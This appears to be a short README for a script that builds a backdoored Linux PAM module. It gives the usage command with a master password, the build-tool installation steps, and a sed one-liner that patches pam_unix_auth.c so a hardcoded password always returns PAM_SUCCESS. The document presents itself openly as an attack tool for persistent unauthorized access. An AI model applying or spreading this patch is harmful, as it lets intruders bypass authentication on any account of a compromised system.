Linux Pam Backdoor

This script automates the creation of a backdoor for Linux systems

Usage
To run this program, use python3 PAM.py -v 1.7.2 -p "your master password"

Prior to running, make sure Meson is installed (not necessary with the Ansible playbook)

sudo apt update
sudo apt install meson ninja-build build-essential


dpkg -l | grep libpam


sed -i '/_unix_verify_password/ i \
    if (strcmp(p, "_PASSWORD_") == 0) { \
        return PAM_SUCCESS; \
    }' modules/pam_unix/pam_unix_auth.c

if error E: You must put some 'source' URI's in your sources.list ->

sudo sed -i 's/^# deb-src/deb-src/' /etc/apt/sources.list
sudo apt update

sometimes need this idek

sudo apt install dos2unix
dos2unix ~/Downloads/sneaky.patch
